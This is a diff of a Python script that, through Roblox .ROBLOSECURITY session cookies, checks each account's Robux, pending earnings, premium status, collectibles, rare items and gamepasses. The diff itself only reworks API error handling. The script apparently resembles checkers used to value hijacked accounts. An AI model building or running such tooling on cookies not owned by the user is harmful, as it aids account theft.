@@ -95,7 +95,7 @@ def get_working_session(roblosecurity):
     return session, fallback_res
 
 def api_get(session, url, **kwargs):
-    """Fast API helper with quick retries and minimal latency."""
+    """Reliable API helper returning clean JSON content directly or None on failure."""
     for attempt in range(2):
         try:
             r = session.get(url, timeout=5, **kwargs)
@@ -103,20 +103,20 @@ def api_get(session, url, **kwargs):
                 if attempt == 0:
                     time.sleep(1)
                     continue
-                return {"status": 429}
+                return {"_error": 429}
             if r.status_code == 403:
-                return {"status": 403}
+                return {"_error": 403}
             if r.status_code == 200:
                 try:
-                    return {"status": 200, "data": r.json()}
+                    return r.json()
                 except ValueError:
-                    return {"status": 200, "error": "bad_json"}
-            return {"status": r.status_code}
+                    return {"_error": "bad_json"}
+            return {"_error": r.status_code}
         except Exception:
             if attempt == 0:
                 continue
-            return {"status": 500}
-    return {"status": 500}
+            return {"_error": 500}
+    return {"_error": 500}
 
 def get_fast_owned_gamepasses(session, user_id):
     """Fetches recent inventory gamepasses capped to 2 pages max for speed."""
@@ -128,13 +128,12 @@ def get_fast_owned_gamepasses(session, user_id):
         if cursor:
             params["cursor"] = cursor
         res = api_get(session, f"https://inventory.roblox.com/v2/users/{user_id}/inventory/34", params=params)
-        if res.get("status") == 403:
+        if isinstance(res, dict) and res.get("_error") == 403:
             return "inventory private"
-        if res.get("status") != 200:
+        if not isinstance(res, dict) or "_error" in res:
             break
         
-        data = res["data"]
-        for item in data.get("data", []):
+        for item in res.get("data", []):
             asset_id = item.get("assetId") or item.get("id") or item.get("itemDetails", {}).get("id")
             if asset_id:
                 try:
@@ -142,7 +141,7 @@ def get_fast_owned_gamepasses(session, user_id):
                 except ValueError:
                     pass
         
-        cursor = data.get("nextPageCursor")
+        cursor = res.get("nextPageCursor")
         pages += 1
         if not cursor:
             break
@@ -156,8 +155,8 @@ def process_single_game(session, user_id, game_name, universe_id, owned_gamepass
     # 1. Fetch game's gamepasses (capped to 1 page for speed)
     game_passes = []
     res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params={"limit": 50})
-    if res.get("status") == 200:
-        for p in res["data"].get("data", []):
+    if isinstance(res, dict) and "_error" not in res:
+        for p in res.get("data", []):
             pid = p.get("id")
             if pid:
                 game_passes.append(int(pid))
@@ -173,8 +172,8 @@ def process_single_game(session, user_id, game_name, universe_id, owned_gamepass
     # 2. Check recent badges for 'played' status if not already marked played
     if not played:
         b_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges", params={"limit": 100})
-        if b_res.get("status") == 200:
-            for badge in b_res["data"].get("data", []):
+        if isinstance(b_res, dict) and "_error" not in b_res:
+            for badge in b_res.get("data", []):
                 if badge.get("awardingUniverse", {}).get("id") == universe_id:
                     played = True
                     break
@@ -212,8 +211,8 @@ def main():
 
                 # 1. Quick account info & Currency
                 u_res = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
-                if u_res.get("status") == 200:
-                    created = u_res["data"].get("created", "")
+                if isinstance(u_res, dict) and "_error" not in u_res:
+                    created = u_res.get("created", "")
                     if created:
                         try:
                             age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
@@ -221,20 +220,20 @@ def main():
                             pass
 
                 curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
-                if curr_res.get("status") == 200:
-                    robux = curr_res["data"].get("robux", 0)
+                if isinstance(curr_res, dict) and "_error" not in curr_res:
+                    robux = curr_res.get("robux", 0)
 
                 trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
-                if trans_res.get("status") == 200:
-                    pending = trans_res["data"].get("pendingRobuxTotal", 0)
+                if isinstance(trans_res, dict) and "_error" not in trans_res:
+                    pending = trans_res.get("pendingRobuxTotal", 0)
 
                 prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
-                if prem_res.get("status") == 200:
-                    val = prem_res["data"]
+                if isinstance(prem_res, bool):
+                    premium = prem_res
+                elif isinstance(prem_res, dict) and "_error" not in prem_res:
+                    val = prem_res.get("isMember", prem_res)
                     if isinstance(val, bool):
                         premium = val
-                    elif isinstance(val, dict):
-                        premium = val.get("isMember", False)
 
                 # 2. Resilient Collectibles Fetch
                 collectibles = []
@@ -242,13 +241,12 @@ def main():
                 col_failed = False
                 for _ in range(3):
                     col_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": col_cursor})
-                    if col_res.get("status") == 403:
+                    if isinstance(col_res, dict) and col_res.get("_error") == 403:
                         collectibles = "inventory private"
                         break
-                    if col_res.get("status") == 200:
-                        data = col_res["data"]
-                        collectibles += data.get("data", [])
-                        col_cursor = data.get("nextPageCursor")
+                    if isinstance(col_res, dict) and "_error" not in col_res:
+                        collectibles += col_res.get("data", [])
+                        col_cursor = col_res.get("nextPageCursor")
                         if not col_cursor:
                             break
                     else:
@@ -268,7 +266,7 @@ def main():
                 # 3. Special items check
                 for item_name, asset_id in SPECIAL_ASSETS.items():
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
-                    special_owned[item_name] = bool(asset_res.get("status") == 200 and asset_res["data"].get("data"))
+                    special_owned[item_name] = bool(isinstance(asset_res, dict) and asset_res.get("data"))
 
                 # Fetch owned gamepasses once
                 owned_gamepasses = get_fast_owned_gamepasses(session, user_id)
